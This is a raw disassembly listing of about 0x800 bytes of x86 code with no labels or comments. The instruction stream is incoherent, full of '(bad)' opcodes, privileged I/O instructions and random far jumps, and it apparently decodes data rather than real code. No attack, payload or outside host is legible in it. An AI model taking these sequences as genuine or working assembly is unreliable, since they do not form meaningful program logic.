  417d57:	jp     0x417cdf
  417d59:	enter  0xd58b,0xa
  417d5d:	loop   0x417d40
  417d5f:	pop    ecx
  417d60:	dec    ecx
  417d61:	(bad)  
  417d62:	pop    eax
  417d63:	sar    BYTE PTR [esp+esi*4],1
  417d66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d67:	mov    dl,0x68
  417d69:	or     BYTE PTR [ebx+0x22990860],ch
  417d6f:	adc    edx,edi
  417d71:	imul   edi,ebx,0x93dfc93b
  417d77:	icebp  
  417d78:	mov    eax,ds:0x4fce3038
  417d7d:	jne    0x417d70
  417d7f:	loopne 0x417d5f
  417d81:	ins    DWORD PTR es:[edi],dx
  417d82:	inc    ecx
  417d83:	bound  eax,QWORD PTR [eax]
  417d85:	xchg   esp,eax
  417d86:	out    0x3c,al
  417d88:	xor    al,0x9f
  417d8a:	test   al,0xd7
  417d8c:	aas    
  417d8d:	mov    edx,0x3d7671f8
  417d92:	pop    ss
  417d93:	mov    ebp,0x15026c13
  417d98:	scas   al,BYTE PTR es:[edi]
  417d99:	mov    ebx,0x20105a43
  417d9e:	jo     0x417e15
  417da0:	in     eax,dx
  417da1:	dec    ecx
  417da2:	pusha  
  417da3:	fwait
  417da4:	into   
  417da5:	mov    dl,0x44
  417da7:	test   al,0xa3
  417da9:	ret    
  417daa:	ret    0x828d
  417dad:	aaa    
  417dae:	aaa    
  417daf:	fisub  DWORD PTR [esi+0x65]
  417db2:	(bad)  
  417db3:	(bad)
  417db6:	mov    eax,ds:0xf335fea0
  417dbb:	mov    dh,0x97
  417dbd:	popa   
  417dbe:	cmp    ebp,DWORD PTR [ebx-0x2b]
  417dc1:	in     eax,dx
  417dc2:	out    0xae,eax
  417dc4:	and    eax,0x38fdbb0
  417dc9:	mov    bl,0x1
  417dcb:	dec    edi
  417dcc:	inc    ebp
  417dcd:	inc    ecx
  417dce:	nop
  417dcf:	cli    
  417dd0:	add    edx,esi
  417dd2:	pop    ecx
  417dd3:	repz jno 0x417db5
  417dd6:	cli    
  417dd7:	xchg   ebx,eax
  417dd8:	fldenv [eax-0x23]
  417ddb:	push   edi
  417ddc:	std    
  417ddd:	push   ss
  417dde:	cld    
  417ddf:	iret   
  417de0:	mov    bh,0x72
  417de2:	outs   dx,DWORD PTR ds:[esi]
  417de3:	call   DWORD PTR [edi+0x6d1acac3]
  417de9:	fwait
  417dea:	lods   eax,DWORD PTR ds:[esi]
  417deb:	stc    
  417dec:	dec    ecx
  417ded:	pop    edx
  417dee:	add    al,0xea
  417df0:	sbb    DWORD PTR [esi-0x7a270f8f],ebx
  417df6:	lock popa 
  417df8:	jle    0x417e78
  417dfa:	inc    esi
  417dfb:	pop    edx
  417dfc:	cmp    edi,ecx
  417dfe:	and    DWORD PTR [ecx+0x908d3bd],ecx
  417e04:	jne    0x417e57
  417e06:	add    BYTE PTR [edi],dl
  417e08:	mov    WORD PTR [edi+0x60c782f6],cs
  417e0e:	mov    dl,0x50
  417e10:	jge    0x417dd9
  417e12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e13:	stos   DWORD PTR es:[edi],eax
  417e14:	mov    bh,0xa7
  417e16:	jecxz  0x417e73
  417e18:	fwait
  417e19:	inc    eax
  417e1a:	fidiv  WORD PTR [ebx+0x1f]
  417e1d:	cmp    ah,0x66
  417e20:	cli    
  417e21:	add    bl,BYTE PTR [esi]
  417e23:	cmp    ah,BYTE PTR [ecx]
  417e25:	stos   BYTE PTR es:[edi],al
  417e26:	lods   al,BYTE PTR ds:[esi]
  417e27:	add    BYTE PTR ds:0xc6590d39,ch
  417e2d:	xchg   BYTE PTR es:0x3710566f,al
  417e34:	xlat   BYTE PTR ds:[ebx]
  417e35:	jle    0x417e29
  417e37:	adc    BYTE PTR [edi+0x46c11d00],bh
  417e3d:	fwait
  417e3e:	js     0x417e2d
  417e40:	pop    ds
  417e41:	popa   
  417e42:	out    0xe3,eax
  417e44:	getsec 
  417e46:	repz leave 
  417e48:	out    0xab,eax
  417e4a:	shl    BYTE PTR [esi],0xc0
  417e4d:	ds jnp 0x417e1c
  417e50:	add    ah,dl
  417e52:	mov    fs,WORD PTR [ebp+edx*1+0x45ccd7d1]
  417e59:	pusha  
  417e5a:	dec    ebx
  417e5b:	and    DWORD PTR [edx],ecx
  417e5d:	dec    ebp
  417e5e:	push   0x427930f
  417e63:	mov    DWORD PTR [edx+edx*4-0x41815235],0x313315c7
  417e6e:	bound  ebp,QWORD PTR [edx]
  417e70:	push   0x11f96485
  417e75:	ja     0x417e14
  417e77:	xchg   DWORD PTR fs:[ebx],edi
  417e7a:	xchg   ebp,eax
  417e7b:	pop    edx
  417e7c:	scas   eax,DWORD PTR es:[edi]
  417e7d:	cs retf 
  417e7f:	mov    dl,BYTE PTR [ebx]
  417e81:	pop    edi
  417e82:	jnp    0x417ebe
  417e84:	in     eax,0x9
  417e86:	mov    dh,0x87
  417e88:	jmp    0x4c93:0xd4b850ad
  417e8f:	cmc    
  417e90:	repnz mov DWORD PTR [edi-0x52],edx
  417e94:	mov    ds:0x5f8b1823,eax
  417e99:	sbb    eax,0x5e3a20c6
  417e9e:	js     0x417e45
  417ea0:	mov    eax,0x960c3ee4
  417ea5:	xchg   edx,eax
  417ea6:	fldcw  WORD PTR [ecx]
  417ea8:	clc    
  417ea9:	loope  0x417ec0
  417eab:	push   ebp
  417eac:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  417eae:	nop
  417eaf:	jmp    0x5ef3a167
  417eb4:	and    bl,BYTE PTR [ebx-0x2da187a6]
  417eba:	xchg   esp,eax
  417ebb:	adc    dl,al
  417ebd:	call   FWORD PTR ds:0x4f95667a
  417ec3:	(bad)  
  417ec4:	sahf   
  417ec5:	std    
  417ec6:	mov    ebp,0x56d84a7
  417ecb:	inc    ecx
  417ecc:	(bad)  
  417ecd:	in     al,0xcf
  417ecf:	xlat   BYTE PTR ds:[ebx]
  417ed0:	dec    eax
  417ed1:	dec    ecx
  417ed2:	adc    eax,DWORD PTR [ebp+0x4c]
  417ed5:	or     eax,0xa85fce52
  417eda:	inc    eax
  417edb:	xchg   ebp,eax
  417edc:	mov    edx,0xcdfb4f53
  417ee1:	mul    DWORD PTR [edx-0x6e]
  417ee4:	adc    edi,DWORD PTR [ebp+0x55a8a9f8]
  417eea:	xor    eax,0x6f98bbf9
  417eef:	mov    ecx,0xba79495c
  417ef4:	pop    ss
  417ef5:	(bad)  
  417ef6:	cld    
  417ef7:	neg    BYTE PTR [ebx-0x73]
  417efa:	mov    edi,0x29b42ff7
  417eff:	adc    eax,0xfbfb0ebe
  417f04:	inc    ecx
  417f05:	cdq    
  417f06:	fwait
  417f07:	sti    
  417f08:	cld    
  417f09:	inc    eax
  417f0a:	jnp    0x417e93
  417f0c:	sbb    al,0xcc
  417f0e:	ins    BYTE PTR es:[edi],dx
  417f0f:	les    edx,FWORD PTR [edi+edx*4]
  417f12:	jecxz  0x417e98
  417f14:	xchg   esi,eax
  417f15:	in     al,0x8c
  417f17:	dec    esp
  417f18:	pop    edx
  417f19:	(bad)  
  417f1b:	mov    ecx,ecx
  417f1d:	sbb    cl,BYTE PTR [eax]
  417f1f:	data16 sahf 
  417f21:	xlat   BYTE PTR ds:[ebx]
  417f22:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f24:	or     esi,DWORD PTR [esi+0x4a1fda24]
  417f2a:	jp     0x417ee4
  417f2c:	sbb    al,0xf1
  417f2e:	das    
  417f2f:	stos   BYTE PTR es:[edi],al
  417f30:	jmp    DWORD PTR [eax-0x18e7684c]
  417f36:	cmp    DWORD PTR [esi+ebx*8-0x5e],0x6fa826e9
  417f3e:	into   
  417f3f:	inc    edx
  417f40:	hlt    
  417f41:	jae    0x417f40
  417f43:	jge    0x417fb3
  417f45:	mov    ch,0x8d
  417f47:	mov    cl,bh
  417f49:	les    ebx,FWORD PTR [edx+edx*2]
  417f4c:	rcl    ch,0xf4
  417f4f:	mov    ebp,0xc044bd3
  417f54:	cmp    eax,0x982e2372
  417f59:	inc    ebp
  417f5a:	mov    dh,0xe3
  417f5c:	cs jnp 0x417fd1
  417f5f:	cmp    eax,0x3ecbb31d
  417f64:	jmp    FWORD PTR [esp+ecx*1]
  417f67:	adc    ebx,ecx
  417f69:	and    al,0xb4
  417f6b:	and    BYTE PTR [eax],dh
  417f6d:	aas    
  417f6e:	mov    BYTE PTR [ebx+0x42],dl
  417f71:	mov    edx,0xea3e7f21
  417f76:	pop    ebp
  417f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f78:	mov    dl,0x26
  417f7a:	sub    BYTE PTR [esi+esi*4+0x2a],0xa9
  417f7f:	fwait
  417f80:	leave  
  417f81:	in     eax,dx
  417f82:	mov    esp,0xa6b011b5
  417f87:	scas   al,BYTE PTR es:[edi]
  417f88:	call   0x1cc:0x9ffb229c
  417f8f:	sbb    DWORD PTR [ecx],edi
  417f91:	add    eax,0x9a226ac9
  417f96:	inc    esp
  417f97:	ja     0x417f8b
  417f99:	dec    ch
  417f9b:	mov    eax,ds:0xe8d08e56
  417fa0:	(bad)  
  417fa2:	call   0xb215:0x65ea2a59
  417fa9:	pop    es
  417faa:	in     al,0xa4
  417fac:	(bad)
  417fb0:	out    0x3,eax
  417fb2:	aad    0xe6
  417fb4:	sbb    DWORD PTR [edi+0x29729fbe],0x45
  417fbb:	loope  0x417f92
  417fbd:	pop    esp
  417fbe:	cmp    eax,0x5479fd78
  417fc3:	mov    ds:0x1333568e,eax
  417fc8:	div    DWORD PTR [ebx-0x59]
  417fcb:	or     eax,DWORD PTR [edx+0x7f2676da]
  417fd1:	cmp    BYTE PTR [eax],cl
  417fd3:	push   ebx
  417fd4:	xor    esi,DWORD PTR es:[eax-0x42]
  417fd8:	or     eax,0x185547c7
  417fdd:	(bad)  
  417fdf:	rol    BYTE PTR [eax+0x3f],0x9c
  417fe3:	fdivr  QWORD PTR ds:0x8c332562
  417fe9:	out    dx,al
  417fea:	lods   al,BYTE PTR ds:[esi]
  417feb:	inc    BYTE PTR [ebx]
  417fed:	add    eax,0x6b77db43
  417ff2:	sbb    al,BYTE PTR [esi]
  417ff4:	ds adc ah,ah
  417ff7:	xchg   ebp,eax
  417ff8:	pop    ebx
  417ff9:	cld    
  417ffa:	push   esi
  417ffb:	mov    ds,WORD PTR [edx]
  417ffd:	(bad)
  418000:	not    BYTE PTR [ebx+0x77daf93a]
  418006:	ror    BYTE PTR [edi-0x2b1903a6],cl
  41800c:	jbe    0x417f9f
  41800e:	int    0xba
  418010:	lods   eax,DWORD PTR ds:[esi]
  418011:	arpl   WORD PTR [esi+0x3f57f8c2],di
  418017:	cs ret 
  418019:	cli    
  41801a:	fimul  DWORD PTR [esi+0x21]
  41801d:	sub    edi,DWORD PTR [ebp-0x45b72b82]
  418023:	add    ah,BYTE PTR ds:0xd298358b
  418029:	shr    DWORD PTR [edx+esi*1],1
  41802c:	or     ah,BYTE PTR [ecx-0x1d249369]
  418032:	jne    0x41805e
  418034:	pop    esp
  418035:	neg    BYTE PTR [edi-0x3e]
  418038:	mov    DWORD PTR [edx+edi*4],ebp
  41803b:	jl     0x41803c
  41803d:	inc    ebx
  41803e:	mov    cs,esi
  418040:	jnp    0x417ff2
  418042:	popf   
  418043:	cmp    cl,BYTE PTR [ebp+0x66]
  418046:	das    
  418047:	or     DWORD PTR [edx+0x76],esi
  41804a:	not    BYTE PTR [eax]
  41804c:	lea    ebp,[ebx-0x7c]
  41804f:	fsub   QWORD PTR [esi]
  418051:	fistp  DWORD PTR ds:0xc76e65dd
  418057:	imul   ecx,ebp,0xfb7981c3
  41805d:	inc    ebx
  41805e:	jbe    0x41806d
  418060:	ror    DWORD PTR [ecx-0x67],0x61
  418064:	cmp    DWORD PTR [eax-0x7c909267],edx
  41806a:	xor    eax,DWORD PTR es:[edi-0x7a81133f]
  418071:	mov    esp,0x3e02348b
  418076:	adc    cl,BYTE PTR [eax-0x43]
  418079:	adc    DWORD PTR [ebp-0xe4bbe18],0x45e6f2c7
  418083:	fwait
  418084:	(bad)  
  418085:	and    BYTE PTR [esi],bh
  418087:	dec    edi
  418088:	fstp   QWORD PTR [edx]
  41808a:	push   cs
  41808b:	les    edi,FWORD PTR [edx+0x27]
  41808e:	push   0x3fe6131
  418093:	sbb    eax,0xe4ebf0ce
  418098:	jecxz  0x4180ea
  41809a:	fimul  DWORD PTR [edi-0x17]
  41809d:	adc    DWORD PTR [esi-0x73],eax
  4180a0:	mov    bh,0xf7
  4180a2:	dec    esp
  4180a3:	stc    
  4180a4:	jmp    0x6de3:0x32091161
  4180ab:	sub    eax,DWORD PTR [edi-0x54]
  4180ae:	jp     0x418039
  4180b0:	jmp    0xa207:0x25c21fac
  4180b7:	jno    0x418069
  4180b9:	jno    0x418060
  4180bb:	jecxz  0x418055
  4180bd:	sbb    BYTE PTR [ebx],dh
  4180bf:	test   al,0x67
  4180c1:	leave  
  4180c2:	je     0x418116
  4180c4:	and    al,BYTE PTR [eax]
  4180c6:	or     dl,al
  4180c8:	aam    0xee
  4180ca:	mov    bl,0x7f
  4180cc:	nop
  4180cd:	test   al,0x64
  4180cf:	mov    ds:0x7d7eb18b,al
  4180d4:	pop    ds
  4180d5:	mov    ebx,0xacc0d941
  4180da:	add    eax,0x2b3907c0
  4180df:	push   0x7360d7a2
  4180e4:	push   ebp
  4180e5:	pop    edx
  4180e6:	test   BYTE PTR [ebx+ebp*2+0x42afa296],0x60
  4180ee:	adc    al,0xa7
  4180f0:	arpl   sp,si
  4180f2:	dec    ecx
  4180f3:	cs xchg edx,eax
  4180f5:	scas   al,BYTE PTR es:[edi]
  4180f6:	inc    esi
  4180f7:	(bad)  
  4180f8:	sub    al,0xd3
  4180fa:	(bad)  
  4180fb:	jg     0x41814d
  4180fd:	jns    0x4180af
  4180ff:	inc    esi
  418100:	dec    eax
  418101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418102:	ja     0x418173
  418104:	aaa    
  418105:	xchg   edi,eax
  418106:	aam    0x3f
  418108:	mov    ecx,0x140fe008
  41810d:	push   ss
  41810e:	out    0xc9,al
  418110:	inc    edi
  418111:	scas   al,BYTE PTR es:[edi]
  418112:	xor    DWORD PTR [esi-0x5c48ed63],esp
  418118:	cld    
  418119:	xor    al,0xe1
  41811b:	push   ecx
  41811c:	mov    ah,0x3b
  41811e:	aaa    
  41811f:	xor    cl,ch
  418121:	cmp    esi,eax
  418123:	add    esi,DWORD PTR [esi-0x8e42e2f]
  418129:	aaa    
  41812a:	retf   
  41812b:	sub    esp,edi
  41812d:	pop    esp
  41812e:	fs in  al,dx
  418130:	or     BYTE PTR [eax+0x72e41041],cl
  418136:	sbb    al,0x7a
  418138:	shl    BYTE PTR ds:0x542daa0,cl
  41813e:	mov    eax,ds:0xaf2ba802
  418143:	xor    eax,DWORD PTR [eax-0x75c4570a]
  418149:	sbb    dh,BYTE PTR [edi-0x4c]
  41814c:	jle    0x418165
  41814e:	or     eax,0xb87b79d0
  418153:	sbb    cl,bl
  418155:	mov    ebx,0x36bbe409
  41815a:	mov    ds:0x7f6f674a,al
  41815f:	adc    ch,dh
  418161:	(bad)  
  418162:	push   ebx
  418163:	xchg   dl,dh
  418165:	xchg   DWORD PTR [ebx-0x20],esi
  418168:	push   eax
  418169:	ins    BYTE PTR es:[edi],dx
  41816a:	sbb    BYTE PTR [esi-0x6f],dl
  41816d:	retf   0xb58e
  418170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418171:	out    dx,eax
  418172:	xor    ebp,DWORD PTR [eax]
  418174:	loop   0x4181ad
  418176:	ds (bad) 
  418178:	cwde   
  418179:	push   ds
  41817a:	jb     0x418140
  41817c:	mov    ah,0x7b
  41817e:	cmp    dh,BYTE PTR [ecx-0x7e]
  418181:	mov    bl,0x63
  418183:	xchg   BYTE PTR [eax+0x2e],ah
  418186:	push   es
  418187:	xchg   ebp,eax
  418188:	(bad)  
  418189:	stos   DWORD PTR es:[edi],eax
  41818a:	enter  0x40e3,0x99
  41818e:	aas    
  41818f:	jecxz  0x41815a
  418191:	adc    ax,0xe793
  418195:	(bad)  
  418196:	popa   
  418197:	push   es
  418198:	inc    DWORD PTR [ebp+0x5a]
  41819b:	aas    
  41819c:	sbb    ecx,esi
  41819e:	and    BYTE PTR [eax],bl
  4181a0:	mov    edi,0x2e599845
  4181a5:	sbb    ecx,DWORD PTR [ecx-0x3e89ac08]
  4181ab:	fldenv [ebp-0x65]
  4181ae:	clc    
  4181af:	test   BYTE PTR ds:0x9d4c513e,dl
  4181b5:	xchg   edx,eax
  4181b6:	adc    al,0x7
  4181b8:	icebp  
  4181b9:	inc    esp
  4181ba:	mov    ds:0xa0d23fdf,eax
  4181bf:	cwde   
  4181c0:	sahf   
  4181c1:	pop    ebp
  4181c2:	fidiv  WORD PTR [esi+edx*4-0x1d]
  4181c6:	into   
  4181c7:	xlat   BYTE PTR ds:[ebx]
  4181c8:	xor    dh,BYTE PTR [esi+0x61b1225a]
  4181ce:	int    0xbb
  4181d0:	xor    ebp,edi
  4181d2:	inc    ecx
  4181d3:	and    BYTE PTR [eax-0x55],ah
  4181d6:	pushf  
  4181d7:	fwait
  4181d8:	ja     0x4181a7
  4181da:	ja     0x4181dc
  4181dc:	push   eax
  4181dd:	inc    ebx
  4181de:	sbb    esi,ecx
  4181e0:	clc    
  4181e1:	add    al,0xb6
  4181e3:	ins    BYTE PTR es:[edi],dx
  4181e4:	add    al,0xc1
  4181e6:	sbb    BYTE PTR [esi+0x31500e23],ah
  4181ec:	sbb    al,0xa9
  4181ee:	call   0xdada:0xb247792b
  4181f5:	bound  esi,QWORD PTR [ebx+0x128be76d]
  4181fb:	inc    ecx
  4181fc:	jne    0x4181a3
  4181fe:	mul    BYTE PTR ds:0xa33786fa
  418204:	stc    
  418205:	xchg   ebp,eax
  418206:	ds push eax
  418208:	imul   ebx,esi,0xca7eb177
  41820e:	sub    edx,edx
  418210:	and    eax,0xfed5a34d
  418215:	sub    DWORD PTR [ebx-0xe650db5],0x8a780897
  41821f:	ins    DWORD PTR es:[edi],dx
  418220:	inc    BYTE PTR [ebx+0x28]
  418223:	lods   al,BYTE PTR ds:[esi]
  418224:	and    BYTE PTR [eax],dl
  418226:	sbb    BYTE PTR [esi],0x72
  418229:	sub    DWORD PTR [eax+ebx*1],0xffffffd5
  41822d:	or     al,0x78
  41822f:	stos   BYTE PTR es:[edi],al
  418230:	sbb    BYTE PTR ds:0x7b8f0d23,dh
  418236:	enter  0xba2b,0x34
  41823a:	lock adc al,0xd2
  41823d:	js     0x41824d
  41823f:	(bad)  
  418240:	xchg   ebx,eax
  418241:	mov    WORD PTR [ecx-0x7b],cs
  418244:	bound  ebx,QWORD PTR [edx+edi*1-0x10]
  418248:	push   es
  418249:	cmp    al,0x9f
  41824b:	loope  0x4182a4
  41824d:	stc    
  41824e:	es xchg esp,eax
  418250:	pop    es
  418251:	popf   
  418252:	xchg   ebx,eax
  418253:	repz les edx,FWORD PTR [ebx-0x65cba37e]
  41825a:	jl     0x4182c1
  41825c:	sbb    BYTE PTR [ecx+0x7],ch
  41825f:	rol    BYTE PTR [edx-0x3],0x78
  418263:	xchg   edi,eax
  418264:	mov    ebx,0x485129ab
  418269:	aad    0xc4
  41826b:	and    DWORD PTR ds:0x75393905,eax
  418271:	sbb    DWORD PTR [esp+edx*8-0x7],esp
  418275:	sbb    al,0x8a
  418277:	sahf   
  418278:	jg     0x418281
  41827a:	mov    dl,0x1c
  41827c:	mov    ch,0x63
  41827e:	pop    ebp
  41827f:	pop    edi
  418280:	xchg   ebp,eax
  418281:	test   eax,0xabaa7407
  418286:	outs   dx,DWORD PTR ds:[esi]
  418287:	xor    edx,eax
  418289:	je     0x418221
  41828b:	dec    eax
  41828c:	jns    0x4182a0
  41828e:	cmp    eax,DWORD PTR [esi]
  418290:	imul   esp,DWORD PTR [eax+ecx*2],0x5
  418294:	xchg   esi,eax
  418295:	ja     0x418288
  418297:	push   esp
  418299:	loopne 0x4182a1
  41829b:	push   0xffffffba
  41829d:	xlat   BYTE PTR ds:[ebx]
  41829e:	jecxz  0x41827c
  4182a0:	jae    0x418226
  4182a2:	xchg   esi,eax
  4182a3:	bnd jg 0x4182be
  4182a6:	fs aas 
  4182a8:	dec    ebp
  4182a9:	push   ds
  4182aa:	test   DWORD PTR [ecx],0xf6eabf58
  4182b0:	and    BYTE PTR [ecx+ebx*4+0x186d6af6],ch
  4182b7:	xor    ebp,eax
  4182b9:	mov    esp,0xab846f6b
  4182be:	or     bl,BYTE PTR [ecx]
  4182c0:	mov    dl,0x27
  4182c2:	xchg   BYTE PTR [eax+0x67f537cf],al
  4182c8:	sbb    eax,DWORD PTR [eax-0x43]
  4182cb:	adc    eax,DWORD PTR [eax]
  4182cd:	and    BYTE PTR [ebp-0x74],0xa6
  4182d1:	cmp    DWORD PTR [ecx],eax
  4182d3:	xchg   ecx,eax
  4182d4:	arpl   WORD PTR [ebx+ecx*1-0x52f3871b],ax
  4182db:	push   0xfffffffd
  4182dd:	mov    edx,0x9a9432b
  4182e2:	pop    edi
  4182e3:	mov    esi,0x7a170c1b
  4182e8:	push   eax
  4182e9:	in     eax,dx
  4182ea:	and    eax,0x95e3c45b
  4182ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182f0:	scas   eax,DWORD PTR es:[edi]
  4182f1:	(bad)  
  4182f2:	sti    
  4182f3:	cwde   
  4182f4:	mov    dl,0xc0
  4182f6:	je     0x418288
  4182f8:	cwde   
  4182f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182fa:	cs push ds
  4182fc:	xor    ebx,DWORD PTR [edx+0x5e]
  4182ff:	hlt    
  418300:	jbe    0x418340
  418302:	ffree  st(1)
  418304:	push   esp
  418305:	jp     0x41833e
  418307:	shl    DWORD PTR ss:[ebx+0x70],cl
  41830b:	ins    DWORD PTR es:[edi],dx
  41830c:	je     0x4182c3
  41830e:	push   ebx
  418310:	popa   
  418311:	mov    edx,0x3dd82d70
  418316:	ret    
  418317:	in     eax,dx
  418318:	repz aaa 
  41831a:	in     al,dx
  41831b:	mov    ch,0xa1
  41831d:	xchg   bh,dl
  41831f:	hlt    
  418320:	xor    eax,0xd47ae3db
  418325:	pop    esi
  418326:	sub    BYTE PTR [edi+0x68],dh
  418329:	mov    al,BYTE PTR [edx+0x2bce594e]
  41832f:	xchg   edi,eax
  418330:	(bad)  [edi]
  418332:	jg     0x4183a7
  418334:	clc    
  418335:	out    dx,al
  418336:	mov    al,ds:0xf602163f
  41833b:	les    eax,FWORD PTR [esi+ecx*8]
  41833e:	xchg   ecx,eax
  41833f:	mov    ecx,DWORD PTR [ebp-0x3a0ee19f]
  418345:	int3   
  418346:	inc    ebx
  418347:	add    esi,esi
  418349:	stos   DWORD PTR es:[edi],eax
  41834a:	in     eax,dx
  41834b:	push   edi
  41834c:	repz test DWORD PTR [edi+0x7c],0x28060acb
  418354:	push   edx
  418355:	push   ecx
  418356:	loop   0x418369
  418358:	mov    DWORD PTR [edi+0x7f],eax
  41835b:	sbb    ah,0xc7
  41835e:	out    0xce,al
  418360:	or     DWORD PTR [esi-0x6f],ebx
  418363:	sahf   
  418364:	xlat   BYTE PTR ds:[ebx]
  418365:	mov    al,0xc6
  418367:	and    eax,DWORD PTR [esi+0x14e2a136]
  41836d:	lods   al,BYTE PTR ds:[esi]
  41836e:	mov    eax,ds:0x374709bf
  418374:	iret   
  418375:	mov    BYTE PTR [ebx],cl
  418377:	pop    esp
  418378:	mov    al,0xf
  41837a:	test   eax,0x61ee5544
  41837f:	es cmp eax,0x6aca0e76
  418385:	or     esp,DWORD PTR [eax+0x7c]
  418388:	call   0x359763d3
  41838d:	inc    esi
  41838e:	mov    edi,0x61717891
  418393:	xchg   BYTE PTR [eax-0x62f59edd],ch
  418399:	mov    cl,0x31
  41839b:	scas   al,BYTE PTR es:[edi]
  41839c:	jbe    0x4183a1
  41839e:	std    
  41839f:	mov    DWORD PTR [edi+0x14],ebx
  4183a2:	adc    al,0x57
  4183a4:	daa    
  4183a5:	push   edx
  4183a6:	add    esp,eax
  4183a8:	inc    edx
  4183a9:	and    DWORD PTR [ecx],eax
  4183ab:	add    bl,BYTE PTR [eax+ecx*8-0x22]
  4183af:	xor    eax,0x26c3d167
  4183b4:	outs   dx,DWORD PTR ds:[esi]
  4183b5:	repnz or BYTE PTR [esi],ah
  4183b8:	aam    0xfa
  4183ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183bb:	call   0xb60bcb84
  4183c0:	and    BYTE PTR [edx-0x1ad3462c],bl
  4183c6:	or     DWORD PTR [ecx-0x1d44a7c5],ebp
  4183cc:	cld    
  4183cd:	bound  edi,QWORD PTR [edi]
  4183cf:	loope  0x418367
  4183d1:	or     DWORD PTR [eax],eax
  4183d3:	in     al,dx
  4183d4:	inc    ebp
  4183d5:	jb     0x418435
  4183d7:	dec    esp
  4183d8:	adc    al,0xa
  4183da:	mov    dl,0xc5
  4183dc:	or     BYTE PTR gs:[ebx],dl
  4183df:	add    al,0x9c
  4183e1:	dec    ecx
  4183e2:	int    0x86
  4183e4:	and    DWORD PTR [esp+eax*1],ebp
  4183e7:	shr    ecx,0xbb
  4183ea:	push   0xe59e7f89
  4183ef:	pop    ebx
  4183f0:	nop
  4183f1:	and    dh,BYTE PTR [edi+0x77]
  4183f4:	dec    edi
  4183f5:	bound  ebp,QWORD PTR [edi+0x3f]
  4183f8:	sub    al,BYTE PTR [edi-0x170a77bf]
  4183fe:	adc    ebx,DWORD PTR [eax]
  418400:	mov    edi,DWORD PTR [bx+di-0x438c]
  418405:	arpl   WORD PTR [edx+0x6c],bx
  418408:	jg     0x418399
  41840a:	je     0x4183e1
  41840c:	xor    BYTE PTR [ebx+0x2ebe93b8],dl
  418412:	in     eax,dx
  418413:	xor    al,0xb8
  418415:	jle    0x418496
  418417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418418:	retf   
  418419:	xchg   esi,eax
  41841a:	mov    ebx,0x3e34596b
  41841f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418420:	push   ecx
  418421:	or     cl,dh
  418423:	push   ebx
  418424:	test   BYTE PTR [ebx+0x2e],cl
  418427:	xor    BYTE PTR es:0xf20faff6,al
  41842e:	and    BYTE PTR [ebx-0x4b],cl
  418431:	retf   
  418432:	into   
  418433:	dec    ecx
  418434:	mov    ds:0x6c69e8d7,eax
  418439:	pop    ebp
  41843a:	test   BYTE PTR [edi+0x41c19efc],0xff
  418441:	lods   eax,DWORD PTR ds:[esi]
  418442:	dec    esi
  418443:	dec    eax
  418444:	mov    bh,0x53
  418446:	sbb    DWORD PTR ds:0xebef0cd5,0xe6066457
  418450:	push   cs
  418451:	or     BYTE PTR [edx],cl
  418453:	mov    edi,0x16b6ba55
  418458:	sub    eax,eax
  41845a:	dec    edx
  41845b:	pop    ecx
  41845c:	mov    bh,0xdd
  41845e:	icebp  
  41845f:	cmp    ebx,edi
  418461:	clc    
  418462:	pop    es
  418463:	mov    esp,0x668f8a17
  418468:	pop    esi
  418469:	loop   0x41843f
  41846b:	scas   eax,DWORD PTR es:[edi]
  41846c:	mov    edx,0x1106ff6f
  418471:	push   esi
  418472:	pop    esi
  418473:	or     al,0xe
  418475:	sub    bl,al
  418477:	sbb    DWORD PTR [edx-0x5f],ebx
  41847a:	sbb    dl,BYTE PTR [eax+0x66]
  41847d:	push   es
  41847e:	add    al,0xa1
  418480:	mov    ds:0xb4a78b1c,al
  418485:	sub    al,0x65
  418487:	int3   
  418488:	xor    BYTE PTR [ecx-0x56],0xd7
  41848c:	pop    es
  41848d:	icebp  
  41848e:	mov    ah,0x1f
  418490:	fisub  DWORD PTR [esp+ecx*4+0x1c]
  418494:	mov    bh,0x7f
  418496:	(bad)  
  418497:	test   ah,ch
  418499:	int    0xb6
  41849b:	retf   
  41849c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41849d:	sbb    eax,0x7378c486
  4184a2:	std    
  4184a3:	pop    esp
  4184a4:	and    al,0x89
  4184a6:	lock sbb DWORD PTR [esi+0x7bdc3c8c],ebp
  4184ad:	enter  0x18fa,0xd5
  4184b1:	int3   
  4184b2:	in     eax,0x4a
  4184b4:	push   edx
  4184b5:	push   eax
  4184b6:	pop    edi
  4184b7:	add    al,0xa5
  4184b9:	out    dx,al
  4184ba:	cdq    
  4184bb:	jae    0x4184ca
  4184bd:	retf   0x2f0b
  4184c0:	and    BYTE PTR [edx+0x219c49f5],dh
  4184c6:	jp     0x4184d2
  4184c8:	jne    0x418537
  4184ca:	cwde   
  4184cb:	adc    DWORD PTR [ecx+0x6e],esi
  4184ce:	div    DWORD PTR [ecx-0x368f7010]
  4184d4:	or     DWORD PTR [esi],ecx
  4184d6:	retf   0xe215
  4184d9:	es pop esp
  4184db:	sub    al,0x2
  4184dd:	ret    0x46f0
  4184e0:	xchg   ebx,eax
  4184e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184e2:	pop    eax
  4184e3:	int3   
  4184e4:	mov    ebx,0x168f62c0
  4184e9:	push   esi
  4184ea:	(bad)  
  4184eb:	cmp    eax,0x534c2877
  4184f0:	test   DWORD PTR [esp+esi*4],ebp
  4184f3:	xchg   ecx,eax
  4184f4:	add    eax,0xffe6561e
  4184f9:	mov    bl,0x3d
  4184fb:	cld    
  4184fc:	add    DWORD PTR [edx+0x525f478a],esi
  418502:	fst    DWORD PTR ds:0xbad7aa94
  418508:	ins    BYTE PTR es:[edi],dx
  418509:	pop    ecx
  41850a:	sbb    BYTE PTR [ebp+0x10aaf655],bl
  418510:	retf   
